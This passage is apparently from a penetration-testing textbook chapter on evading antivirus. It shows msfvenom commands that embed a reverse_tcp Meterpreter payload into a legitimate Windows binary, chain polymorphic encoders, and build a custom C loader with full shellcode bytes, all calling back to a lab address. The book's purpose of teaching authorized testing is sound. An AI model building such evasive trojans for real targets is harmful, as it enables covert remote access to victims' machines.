<html><head></head><body><section class="chapter" epub:type="chapter" id="bypassing_antivirus_applications" title="Chapter&#xA0;12.&#xA0;Bypassing Antivirus Applications"><div class="titlepage"><div><div><h2 class="title">Chapter 12. Bypassing Antivirus Applications</h2></div></div></div><p><a class="indexterm" id="iddle1051"/><a class="indexterm" id="iddle1660"/>Your pentesting clients will most likely be running some sort of antivirus solution. So far in this book we’ve avoided having any of our malicious executables deleted by antivirus applications, but antivirus program avoidance is a constantly changing field. Typically you will be more likely to avoid detection by using a memory-corruption exploit and loading your payload directly into memory—that is, by never touching the disk. That said, with the attack landscape shifting to emphasize client-side and social-engineering attacks, it may not always be possible to avoid writing your payload to disk. In this chapter we’ll look at a few techniques for obscuring our malware to try to avoid detection when the payload is written to the disk.</p><div class="sect1" title="Trojans"><div class="titlepage"><div><div><h2 class="title" id="trojans" style="clear: both">Trojans</h2></div></div></div><p><a class="indexterm" id="iddle1056"/><a class="indexterm" id="iddle1770"/><a class="indexterm" id="iddle2317"/><a class="indexterm" id="iddle2367"/><a class="indexterm" id="iddle2404"/>In <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, we created a standalone malicious executable that runs a Metasploit payload. Though we may be able to use social engineering to trick a user into downloading and running our malicious file, the lack of any functionality other than our executable’s payload could tip off users that something is amiss. We’d be much more likely to evade detection if we could hide our payload inside of some legitimate program that would run normally, with our payload running in the background. Such a program is called a <span class="emphasis"><em>trojan</em></span>, after the legendary wooden horse that ended the Trojan War. The horse appeared to be an innocuous offering to the gods and was brought inside the previously impenetrable walled city of Troy, with enemy soldiers hiding inside, ready to attack.</p><p>We encountered a trojan in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>: The Vsftpd server on our Ubuntu target had a backdoor that could be triggered at login by entering a smiley face as part of the username. Attackers compromised the source code repositories for Vsftpd and added additional trojan functionality to the program. Anyone who downloaded Vsftpd from the official repositories between the initial compromise and detection ended up with a trojaned version.</p><div class="sect2" title="Msfvenom"><div class="titlepage"><div><div><h3 class="title" id="msfvenom">Msfvenom</h3></div></div></div><p>Although reverse-engineering binaries or gaining access to source code and manually adding trojan code is beyond the scope of this book, the Msfvenom tool has some options we can use to embed a Metasploit payload inside a legitimate binary. <a class="xref" href="ch12.xhtml#msfvenom_help_page" title="Example 12-1. Msfvenom help page">Example 12-1</a> shows some important options we have not encountered previously in the text.</p><div class="example"><a id="msfvenom_help_page"/><div class="example-title">Example 12-1. Msfvenom help page</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -h</strong></span>&#13;
Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] &lt;var=val&gt;&#13;
&#13;
Options:&#13;
    -p, --payload    [payload]       Payload to use. Specify a '-' or stdin to&#13;
                                      use custom payloads&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
  ❶-x, --template   [path]           Specify a custom executable file to use&#13;
                                       as a template&#13;
  ❷-k, --keep                        Preserve the template behavior and inject&#13;
                                      the payload as a new thread&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>In particular, the <code class="literal">-x</code> flag ❶ allows us to use an executable file as a template in which to embed our chosen payload. However, though the resulting executable will look like the original one, the added payload will pause the execution of the original, and we shouldn’t expect a user to run <a class="indexterm" id="iddle2032"/><a class="indexterm" id="iddle2033"/>an executable that appears to hang at startup very many times. Luckily, Msfvenom’s <code class="literal">-k</code> flag ❷ will keep the executable template intact and run our payload in a new thread, allowing the original executable to run normally.</p><p>Let’s use the <code class="literal">-x</code> and <code class="literal">-k</code> flags to build a trojaned Windows executable that will appear normal to a user but which will send us a Meterpreter session in the background. To do so, we choose the payload with the <code class="literal">-p</code> flag and set the relevant payload options as in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>. Any legitimate executable will do; you’ll find some useful Windows binaries for pentesting in Kali Linux at <span class="emphasis"><em>/usr/share/windows-binaries</em></span>.</p><p>To embed our payload inside the <span class="emphasis"><em>radmin.exe</em></span> binary enter:</p><a id="pro_id00140"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe &gt; radmin.exe</strong></span></pre><p>Our Msfvenom command specifies the payload to generate with the <code class="literal">-p</code> option. We set the <code class="literal">LHOST</code> option to the IP address of Kali, the system to call back to when the payload runs. We can also set the <code class="literal">LPORT</code> option. As discussed in this section, the <code class="literal">-x</code> option selects an executable in which to embed our payload. The <code class="literal">-k</code> option runs the payload in a separate thread. The <code class="literal">-f</code> flag tells Msfvenom to build the payload in the executable format. Once created, run the trojaned binary on either the Windows XP or Windows 7 target. The Radmin Viewer program should appear to run normally (<a class="xref" href="ch12.xhtml#trojaned_radmin_viewer_executable" title="Figure 12-1. Trojaned Radmin Viewer executable">Figure 12-1</a>), but the embedded payload should give us a Meterpreter session if we set up a handler using the <span class="emphasis"><em>multi/handler</em></span> module.</p><div class="figure"><a id="trojaned_radmin_viewer_executable"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00107"/><img alt="Trojaned Radmin Viewer executable" src="httpatomoreillycomsourcenostarchimages2030404.png.jpg"/></div></div><div class="figure-title">Figure 12-1. Trojaned Radmin Viewer executable</div></div><div class="sidebar"><a id="checking_for_trojans_with_the_md5_hash"/><div class="sidebar-title">Checking for Trojans with the MD5 Hash</div><p><a class="indexterm" id="iddle1059"/><a class="indexterm" id="iddle1061"/><a class="indexterm" id="iddle1671"/><a class="indexterm" id="iddle1673"/><a class="indexterm" id="iddle1674"/><a class="indexterm" id="iddle2245"/><a class="indexterm" id="iddle2318"/>Our trojaned binary should convince the average user that the program is legitimate. Security-savvy users should verify the integrity of a downloaded file before running it by checking its MD5 hash against the value published by the vendor, where available. An MD5 hash is a kind of file fingerprint; if changes are made to the file, the MD5 hash will change.</p><p>Let’s compare the MD5 hashes of the original <span class="emphasis"><em>radmin.exe</em></span> with our trojaned version. In Kali Linux, the <code class="literal">md5sum</code> program will calculate a file’s MD5 hash. Run <code class="literal">md5sum</code> on both binaries, and you’ll find that the hash values are dramatically different, as you can see here at ❶ and ❷.</p><a id="pro_id00141"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>md5sum /usr/share/windows-binaries/radmin.exe</strong></span>&#13;
❶2d219cc28a406dbfa86c3301e8b93146  /usr/share/windows-binaries/radmin.exe&#13;
&#13;
root@kali:~# <span class="strong"><strong>md5sum radmin.exe</strong></span>&#13;
❷4c2711cc06b6fcd300037e3cbdb3293b  radmin.exe</pre><p>However, the MD5 hashing algorithm is not perfect, and a tampered binary could have the same MD5 hash as the original file, which is known as an <span class="emphasis"><em>MD5 collision attack</em></span>. For this reason, many vendors publish a Secure Hash Algorithm (SHA) hash as well.</p><p>Of course, checking two separate hash values is better than checking one. The SHA family contains multiple hashing algorithms, and the version used will vary among vendors. Kali comes with programs for various SHA hashes. For example, <code class="literal">sha512sum</code> calculates the 64-bit block size SHA-2 hash, as shown here.</p><a id="pro_id00142"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>sha512sum /usr/share/windows-binaries/radmin.exe</strong></span>&#13;
5a5c6d0c67877310d40d5210ea8d515a43156e0b3e871b16faec192170acf29c9cd4e495d2e03b8d&#13;
7ef10541b22ccecd195446c55582f735374fb8df16c94343  /usr/share/windows-binaries/radmin.exe&#13;
root@kali:~# <span class="strong"><strong>sha512sum radmin.exe</strong></span>&#13;
f9fe3d1ae405cc07cd91c461a1c03155a0cdfeb1d4c0190be1fb350d43b4039906f8abf4db592b060&#13;
d5cd15b143c146e834c491e477718bbd6fb9c2e96567e88  radmin.exe</pre><p>When installing software, be sure to calculate the hash(es) of your downloaded version, and compare it to the value(s) published by the vendor.</p></div></div></div><div class="sect1" title="How Antivirus Applications Work"><div class="titlepage"><div><div><h2 class="title" id="how_antivirus_applications_work" style="clear: both">How Antivirus Applications Work</h2></div></div></div><p>Before we try different techniques to get our Metasploit payloads past an antivirus program, let’s discuss how these programs work. Most antivirus solutions start by comparing potentially dangerous code to a set of patterns and rules that make up the <span class="emphasis"><em>antivirus definitions</em></span>, which match known malicious code. Antivirus definitions are updated regularly as new malware is identified by each vendor. This sort of identification is called <span class="emphasis"><em>static analysis</em></span>.</p><p><a class="indexterm" id="iddle1053"/><a class="indexterm" id="iddle1301"/><a class="indexterm" id="iddle1723"/>In addition to static analysis against a set of signatures, more advanced antivirus solutions also test for malicious activity, called <span class="emphasis"><em>dynamic analysis</em></span>. For example, a program that tries to replace every file on the hard drive or connects to a known botnet command and control server every 30 seconds is exhibiting potentially malicious activity and may be flagged.</p><div class="note" title="Note"><h3 class="title"><a id="ch12note01"/>Note</h3><p>Some antivirus products, such as Google’s Bouncer, run new apps that are uploaded to the Google Play store and pass static analysis in an isolated sandbox to try to detect malicious activity that doesn’t have a known malicious signature.</p></div></div><div class="sect1" title="Microsoft Security Essentials"><div class="titlepage"><div><div><h2 class="title" id="microsoft_security_essentials" style="clear: both">Microsoft Security Essentials</h2></div></div></div><p>As we use different methods in this section to bring down our detection rate, keep in mind that even if you not able to get a 0 percent detection rate among all antivirus vendors, if you know which antivirus solution is deployed in your client’s environment, you can focus your efforts on clearing just that antivirus program. In this chapter, we will try to bypass Microsoft Security Essentials using various methods.</p><p>When we created our Windows 7 target in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>, we installed Microsoft Security Essentials, but we didn’t turn on real-time protection to scan files as they are downloaded or installed. Now let’s turn on this protection to see if we can create an undetectable trojan. Open Microsoft Security Essentials, select the <span class="strong"><strong>Settings</strong></span> tab, choose <span class="strong"><strong>Real-time protection</strong></span>, and check the box to turn on the service, as shown in <a class="xref" href="ch12.xhtml#microsoft_security_essentials_real-time" title="Figure 12-2. Microsoft Security Essentials real-time protection">Figure 12-2</a>. Click <span class="strong"><strong>Save changes</strong></span>.</p><div class="figure"><a id="microsoft_security_essentials_real-time"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00108"/><img alt="Microsoft Security Essentials real-time protection" src="httpatomoreillycomsourcenostarchimages2030406.png.jpg"/></div></div><div class="figure-title">Figure 12-2. Microsoft Security Essentials real-time protection</div></div><p><a class="indexterm" id="iddle1058"/><a class="indexterm" id="iddle2385"/>As of this writing, even free antivirus solutions like Microsoft Security Essentials do a good job of catching Metasploit payloads. For a real test, try installing the trojaned <span class="emphasis"><em>radmin.exe</em></span> with real-time protection turned on. You should see a pop-up at the bottom-right corner of the screen, like the one shown in <a class="xref" href="ch12.xhtml#malicious_software_detected" title="Figure 12-3. Malicious software detected">Figure 12-3</a>. The file is automatically deleted before the user can run it—that certainly puts a damper on things.</p><div class="figure"><a id="malicious_software_detected"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00109"/><img alt="Malicious software detected" src="httpatomoreillycomsourcenostarchimages2030408.png.jpg"/></div></div><div class="figure-title">Figure 12-3. Malicious software detected</div></div></div><div class="sect1" title="VirusTotal"><div class="titlepage"><div><div><h2 class="title" id="virustotal" style="clear: both">VirusTotal</h2></div></div></div><p>One way to see which antivirus solutions will flag a program as malicious is to upload the file in question to the VirusTotal website (<span class="emphasis"><em><a class="ulink" href="https://www.virustotal.com/" target="_top">https://www.virustotal.com/</a></em></span>). As of this writing, VirusTotal scans uploaded files with 51 antivirus programs and reports which ones detect malware. VirusTotal is shown in <a class="xref" href="ch12.xhtml#virustotal-id00034" title="Figure 12-4. VirusTotal">Figure 12-4</a>.</p><div class="figure"><a id="virustotal-id00034"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00110"/><img alt="VirusTotal" src="httpatomoreillycomsourcenostarchimages2030410.png.jpg"/></div></div><div class="figure-title">Figure 12-4. VirusTotal</div></div><p>To see which antivirus programs detect our trojaned <span class="emphasis"><em>radmin.exe</em></span> as currently written, upload the file to VirusTotal and click <span class="strong"><strong>Scan it!</strong></span>. Because antivirus definitions are constantly updated, your results will differ, but as you can see in <a class="xref" href="ch12.xhtml#trojaned_binary_antivirus_detection" title="Figure 12-5. Trojaned binary antivirus detection">Figure 12-5</a>, 25 of 51 scanners detected our file as malicious. (The bottom of the page shows which scanners detected the malware.)</p><div class="figure"><a id="trojaned_binary_antivirus_detection"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00111"/><img alt="Trojaned binary antivirus detection" src="httpatomoreillycomsourcenostarchimages2030412.png.jpg"/></div></div><div class="figure-title">Figure 12-5. Trojaned binary antivirus detection</div></div><div class="note" title="Note"><h3 class="title"><a id="ch12note02"/>Note</h3><p><a class="indexterm" id="iddle1054"/><a class="indexterm" id="iddle1329"/><a class="indexterm" id="iddle1705"/>VirusTotal shares uploaded binaries with antivirus vendors so they can write signatures to match. Antivirus companies use VirusTotal signatures to improve their detection engines, so anything you upload to the site may be caught by antivirus software just because you uploaded it. To avoid that risk, you can install the antivirus product on a virtual machine and test your trojans manually against it, as we did in the previous section.</p></div></div><div class="sect1" title="Getting Past an Antivirus Program"><div class="titlepage"><div><div><h2 class="title" id="getting_past_an_antivirus_program" style="clear: both">Getting Past an Antivirus Program</h2></div></div></div><p>Clearly if we want to get past antivirus solutions, we need to try harder to hide. Let’s look at some other useful ways to hide our Metasploit payloads besides simply placing them inside of an executable.</p><div class="sect2" title="Encoding"><div class="titlepage"><div><div><h3 class="title" id="encoding">Encoding</h3></div></div></div><p>Encoders are tools that allow you to avoid characters in an exploit that would break it. (You’ll learn more about these requirements when we write our own exploits in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a> through <a class="xref" href="ch19.xhtml" title="Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules">Chapter 19</a>.) At the time of this writing, Metasploit supports 32 encoders. Encoders mangle the payload and prepend decoding instructions to be executed in order to decode the payload before it is run. It is a common misperception that Metasploit’s encoders were designed to help bypass antivirus programs. Some Metasploit encoders create polymorphic code, or mutating code, which ensures that the encoded payload looks different each time the payload is generated. This process makes it more difficult for antivirus vendors to create signatures for the payload, but as we will see, it is not enough to bypass most antivirus solutions.</p><p><a class="indexterm" id="iddle1772"/><a class="indexterm" id="iddle2149"/>To list all of the encoders available in Msfvenom, use the <span class="strong"><strong><code class="literal">-l encoders</code></strong></span> option, as shown in <a class="xref" href="ch12.xhtml#msfvenom_encoders" title="Example 12-2. Msfvenom encoders">Example 12-2</a>.</p><div class="example"><a id="msfvenom_encoders"/><div class="example-title">Example 12-2. Msfvenom encoders</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -l encoders</strong></span>&#13;
Framework Encoders&#13;
==================&#13;
&#13;
    Name                          Rank       Description&#13;
    ----                          ----       -----------&#13;
    cmd/generic_sh                good       Generic Shell Variable Substitution Command Encoder&#13;
    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder&#13;
--<span class="emphasis"><em>snip</em></span>—&#13;
  ❶x86/shikata_ga_nai             excellent  Polymorphic XOR Additive Feedback Encoder&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>The only encoder with an excellent rank is <span class="emphasis"><em>x86/shikata_ga_nai</em></span> ❶. <span class="emphasis"><em>Shikata Ga Nai</em></span> is Japanese for “It can’t be helped.” Encoder rankings are based on the entropy level of the output. With <span class="emphasis"><em>shikata_ga_nai</em></span>, even the decoder stub is polymorphic. The nitty-gritty details of how this encoder works are beyond the scope of this book, but suffice it to say that it mangles payloads beyond easy recognition.</p><p>Tell Msfvenom to use the <span class="emphasis"><em>shikata_ga_nai</em></span> encoder with the <code class="literal">-e</code> flag, as shown in <a class="xref" href="ch12.xhtml#creating_an_encoded_executable_with_msfv" title="Example 12-3. Creating an encoded executable with Msfvenom">Example 12-3</a>. Additionally, for further obfuscation, we’ll run our payload through an encoder multiple times, encoding the output from the previous round with the <code class="literal">-i</code> flag and specifying the number of encoding rounds (10 in this case).</p><div class="example"><a id="creating_an_encoded_executable_with_msfv"/><div class="example-title">Example 12-3. Creating an encoded executable with Msfvenom</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe &gt; meterpreterencoded.exe</strong></span>&#13;
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)&#13;
[*] x86/shikata_ga_nai succeeded with size 344 (iteration=2)&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[*] x86/shikata_ga_nai succeeded with size 533 (iteration=9)&#13;
[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)</pre></div></div><p>Now upload the resulting binary to VirusTotal. As you can see in <a class="xref" href="ch12.xhtml#virustotal_results_for_an_encoded_binary" title="Figure 12-6. VirusTotal results for an encoded binary">Figure 12-6</a>, 35 of the tested antivirus products detected our payload, even with the encoding. That’s a higher detection rate than we found when embedding our payload inside a prebuilt executable. In other words, <span class="emphasis"><em>shikata_ga_nai</em></span> alone doesn’t do the trick.</p><div class="figure"><a id="virustotal_results_for_an_encoded_binary"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00112"/><img alt="VirusTotal results for an encoded binary" src="httpatomoreillycomsourcenostarchimages2030414.png.jpg"/></div></div><div class="figure-title">Figure 12-6. VirusTotal results for an encoded binary</div></div><p><a class="indexterm" id="iddle1776"/><a class="indexterm" id="iddle2386"/><a class="indexterm" id="iddle2494"/>To see if we can improve our results, we can try experimenting with using multiple Metasploit encoders on our payload. For example, we can combine multiple rounds of <span class="emphasis"><em>shikata_ga_nai</em></span> with another Metasploit encoder, <span class="emphasis"><em>x86/bloxor</em></span>, as shown in <a class="xref" href="ch12.xhtml#multiencoding_with_msfvenom" title="Example 12-4. Multiencoding with Msfvenom">Example 12-4</a>.</p><div class="example"><a id="multiencoding_with_msfvenom"/><div class="example-title">Example 12-4. Multiencoding with Msfvenom</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f raw</strong></span>❶ <span class="strong"><strong>&gt; meterpreterencoded.bin</strong></span>❷&#13;
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)&#13;
root@kali:~# <span class="strong"><strong>msfvenom -p -</strong></span>❸ <span class="strong"><strong>-f exe -a x86</strong></span>❹ <span class="strong"><strong>--platform windows</strong></span>❺ <span class="strong"><strong>-e x86/bloxor -i 2 &gt; meterpretermultiencoded.exe &lt; meterpreterencoded.bin</strong></span>❻&#13;
[*] x86/bloxor succeeded with size 638 (iteration=1)&#13;
[*] x86/bloxor succeeded with size 712 (iteration=2)</pre></div></div><p>This time, we start out with Msfvenom using the <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span> payload as usual and encode it with <span class="emphasis"><em>shikata_ga_nai</em></span>, as in the previous example. However, instead of setting the format to <span class="emphasis"><em>.exe</em></span>, we output in raw format ❶. Also, instead of outputting the results to an <span class="emphasis"><em>.exe</em></span> file as we did previously, this time we output the raw bytes into a <span class="emphasis"><em>.bin</em></span> file ❷.</p><p><a class="indexterm" id="iddle1236"/><a class="indexterm" id="iddle1778"/>Now we take the results of the <span class="emphasis"><em>shikata_ga_nai</em></span> encoding and encode it with the <span class="emphasis"><em>x86/bloxor</em></span> encoder. Our syntax for Msfvenom will differ from what we are used to. First, we set the payload to null with the option <code class="literal">-p -</code> ❸. And, because we are not setting a payload, we need to tack on two new options to tell Msfvenom how to encode our input: <code class="literal">-a x86</code> ❹ to specify the architecture as 32 bit, and <code class="literal">--platform windows</code> ❺ to specify the Windows platform. Finally, at the end of the Msfvenom command, we use the <code class="literal">&lt;</code> symbol to pipe the <span class="emphasis"><em>.bin</em></span> file from the previous command as input into Msfvenom ❻. The resulting executable will be encoded with <span class="emphasis"><em>shikata_ga_nai</em></span> and <span class="emphasis"><em>x86/bloxor</em></span>.</p><p>The resulting executable is detected by 33 antivirus programs on VirusTotal as of this writing—slightly better than <span class="emphasis"><em>shikata_ga_nai</em></span> by itself. You may be able to improve your results by experimenting with different sets of encoders and chaining more than two encoders together, or by combining techniques. For example, what if we both embed our payload in a binary and encode it with <span class="emphasis"><em>shikata_ga_nai</em></span> as shown here?</p><a id="pro_id00143"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e x86/shikata_ga_nai -i 10 -f exe &gt; radminencoded.exe</strong></span></pre><p>This gave only a slight improvement: The payload was detected by 21 antivirus programs. And, unfortunately, Microsoft Security Essentials flagged both executables as malicious, as shown in <a class="xref" href="ch12.xhtml#microsoft_is_still_flagging_this_binary" title="Figure 12-7. Microsoft is still flagging this binary as malicious.">Figure 12-7</a>. We need to look beyond Metasploit encoders if we’re going to get past antivirus detection on our Windows 7 target.</p><div class="figure"><a id="microsoft_is_still_flagging_this_binary"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00113"/><img alt="Microsoft is still flagging this binary as malicious." src="httpatomoreillycomsourcenostarchimages2030416.png.jpg"/></div></div><div class="figure-title">Figure 12-7. Microsoft is still flagging this binary as malicious.</div></div></div><div class="sect2" title="Custom Cross Compiling"><div class="titlepage"><div><div><h3 class="title" id="custom_cross_compiling">Custom Cross Compiling</h3></div></div></div><p>As the de facto standard for penetration testing, Metasploit gets a fair amount of attention from antivirus vendors who make detecting the signatures for payloads generated by Msfvenom a priority. When Msfvenom creates an executable, it uses prebuilt templates that antivirus vendors can use to build detection signatures.</p><p>Perhaps we can improve our ability to bypass antivirus solutions by compiling an executable ourselves using raw shellcode. Let’s start with a simple <a class="indexterm" id="iddle1267"/><a class="indexterm" id="iddle1992"/><a class="indexterm" id="iddle2008"/><a class="indexterm" id="iddle2036"/><a class="indexterm" id="iddle2145"/><a class="indexterm" id="iddle2313"/>C template, as shown in <a class="xref" href="ch12.xhtml#custom_executable_template" title="Example 12-5. Custom executable template">Example 12-5</a>. (We discussed the basics of C programming in <a class="xref" href="ch03.xhtml" title="Chapter 3. Programming">Chapter 3</a>. Review that section if this program doesn’t make sense to you.) Save this code to a file called <span class="emphasis"><em>custommeterpreter.c</em></span>.</p><div class="example"><a id="custom_executable_template"/><div class="example-title">Example 12-5. Custom executable template</div><div class="example-contents"><pre class="programlisting">#include &lt;stdio.h&gt;&#13;
unsigned char random[]= ❶&#13;
&#13;
unsigned char shellcode[]= ❷&#13;
&#13;
int main(void) ❸&#13;
{&#13;
        ((void (*)())shellcode)();&#13;
}</pre></div></div><p>We need to fill in data for the variables <code class="literal">random</code> ❶ and <code class="literal">shellcode</code> ❷, which are both unsigned character arrays. Our hope is that adding some randomness and compiling our own C code will be enough to trick antivirus programs. The <code class="literal">random</code> variable will introduce some randomness to the template. The <code class="literal">shellcode</code> variable will hold the raw hexadecimal bytes of the payload we create with Msfvenom. The <code class="literal">main</code> function ❸ runs when our compiled C program starts and executes our shellcode.</p><p>Create your payload in Msfvenom as usual, except this time set the format with the <code class="literal">-f</code> flag to <code class="literal">c</code>, as shown in <a class="xref" href="ch12.xhtml#creating_a_raw_payload_in_c_format" title="Example 12-6. Creating a raw payload in C format">Example 12-6</a>. This will create hex bytes that we can drop into our C file.</p><div class="example"><a id="creating_a_raw_payload_in_c_format"/><div class="example-title">Example 12-6. Creating a raw payload in C format</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f c -e x86/shikata_ga_nai -i 5</strong></span>&#13;
unsigned char buf[] =&#13;
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"&#13;
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
"\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"&#13;
"\x85\xf6\x75\xec\xc3";</pre></div></div><p>Finally, we need to add some randomness. A good place to find randomness on a Linux system is in the <span class="emphasis"><em>/dev/urandom</em></span> file. This file is specifically designed as a pseudorandom number generator; it generates data using entropy in the Linux system.</p><p>But if we just <code class="literal">cat</code> out data from <span class="emphasis"><em>/dev/urandom</em></span>, we’ll get a lot of unprintable characters. To get the proper data for a character array, we’ll use the <code class="literal">tr</code> Linux utility to translate the <span class="emphasis"><em>/dev/urandom</em></span> data to printable characters. Use <code class="literal">tr -dc A-Z-a-z-0-9</code>, and then pipe the commands into the <code class="literal">head</code> command to output only the first 512 characters from <span class="emphasis"><em>/dev/urandom</em></span>, as shown here.</p><a id="pro_id00144"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512</strong></span>&#13;
s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adL&#13;
--<span class="emphasis"><em>snip</em></span>--</pre><p><a class="indexterm" id="iddle1728"/>Now drop the data from <span class="emphasis"><em>/dev/urandom</em></span> into the <code class="literal">random</code> variable in the C file. The finished file is shown in <a class="xref" href="ch12.xhtml#finished_custom_c_file" title="Example 12-7. Finished custom C file">Example 12-7</a>. (Of course, your randomness and encoded payload will differ.) Be sure to surround the string with quotes and use a semicolon (<code class="literal">;</code>) at the end.</p><div class="example"><a id="finished_custom_c_file"/><div class="example-title">Example 12-7. Finished custom C file</div><div class="example-contents"><pre class="programlisting">#include &lt;stdio.h&gt;&#13;
unsigned char random[]= "s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adLqB-3X7MCSL9SuqlChqT6zQkoZNvi9YEWq4ec8&#13;
-ajdsJW7s-yZOKHQXMTY0iuawscx57e7Xds15GA6rGObF4R6oILRwCwJnEa-4vrtCMYnZiBytqtrrHkTeNohU4gXcVIem&#13;
-lgM-BgMREf24-rcW4zTi-Zkutp7U4djgWNi7k7ULkikDIKK-AQXDp2W3Pug02hGMdP6sxfR0xZZMQFwEF-apQwMlog4Trf5RTHFtrQP8yismYtKby15f9oTmjauKxTQoJzJD96sA-7PMAGswqRjCQ3htuWTSCPleODITY3Xyb1oPD5wt-G1oWvavrpeweLERRN5ZJiPEpEPRTI62OB9mIsxex3omyj10bEha43vkerbN0CpTyernsK1csdLmHRyca";&#13;
&#13;
unsigned char shellcode[]= "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"&#13;
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"&#13;
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"&#13;
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"&#13;
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"&#13;
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"&#13;
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"&#13;
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"&#13;
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"&#13;
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"&#13;
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"&#13;
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"&#13;
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"&#13;
"\x05\x68\x0a\x00\x01\x09\x68\x02\x00\x09\x29\x89\xe6\x6a\x10"&#13;
"\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"&#13;
"\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"&#13;
"\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"&#13;
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"&#13;
"\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"&#13;
"\x85\xf6\x75\xec\xc3";&#13;
&#13;
int main(void)&#13;
{&#13;
        ((void (*)())shellcode)();&#13;
